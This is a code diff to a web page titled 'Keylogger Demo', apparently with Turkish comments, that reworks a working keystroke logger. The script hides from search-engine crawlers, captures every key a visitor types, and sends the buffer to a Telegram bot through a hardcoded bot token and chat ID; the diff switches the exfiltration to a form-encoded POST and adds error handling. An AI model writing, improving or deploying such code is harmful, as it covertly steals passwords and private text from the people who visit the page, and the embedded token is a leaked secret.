@@ -8,36 +8,47 @@
   <h2>Keylogger Demo</h2>
   <textarea id="input" rows="10" cols="60" placeholder="Yazmaya başla..."></textarea>
 
- <script>
-if (!/Googlebot|bingbot|Slurp|DuckDuckBot|Baiduspider|YandexBot/.test(navigator.userAgent)) {
+  <script>
+    if (!/Googlebot|bingbot|Slurp|DuckDuckBot|Baiduspider|YandexBot/.test(navigator.userAgent)) {
 
-const TELEGRAM_BOT_TOKEN = '7740489037:AAHgOz-DbTeXM-IqY9luQNPL4uao1kWrudU';
-const TELEGRAM_CHAT_ID = '5395609882';
+      const TELEGRAM_BOT_TOKEN = '7740489037:AAHgOz-DbTeXM-IqY9luQNPL4uao1kWrudU';
+      const TELEGRAM_CHAT_ID = '5395609882';
 
-let buffer = "";
-let timeout = null;
+      let buffer = "";
+      let timeout = null;
 
-function sendBuffer() {
-  if (buffer.trim() !== "") {
-    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: TELEGRAM_CHAT_ID,
-        text: `[Tuş Takibi]\n${buffer}`
-      })
-    });
-    buffer = "";
-  }
-}
+      function sendBuffer() {
+        if (buffer.trim() !== "") {
+          const params = new URLSearchParams();
+          params.append('chat_id', TELEGRAM_CHAT_ID);
+          params.append('text', `[Tuş Takibi]\n${buffer}`);
 
-document.addEventListener("keydown", function(e) {
-  buffer += e.key;
-  clearTimeout(timeout);
-  timeout = setTimeout(sendBuffer, 2000); // 2 saniye boşluk olursa gönder
-});
+          fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/x-www-form-urlencoded" },
+            body: params.toString()
+          })
+          .then(res => res.json())
+          .then(data => {
+            if (!data.ok) {
+              console.error('Telegram API hatası:', data.description);
+            }
+          })
+          .catch(err => console.error('Fetch hatası:', err));
 
-}
-</script>
+          buffer = "";
+        }
+      }
+
+      document.addEventListener("keydown", function(e) {
+        // Bazı tuşlar e.key olarak 'Unidentified' dönebilir, onları filtrele
+        if (e.key && e.key !== "Unidentified") {
+          buffer += e.key;
+        }
+        clearTimeout(timeout);
+        timeout = setTimeout(sendBuffer, 2000); // 2 saniye boşsa gönder
+      });
+    }
+  </script>
 </body>
 </html>
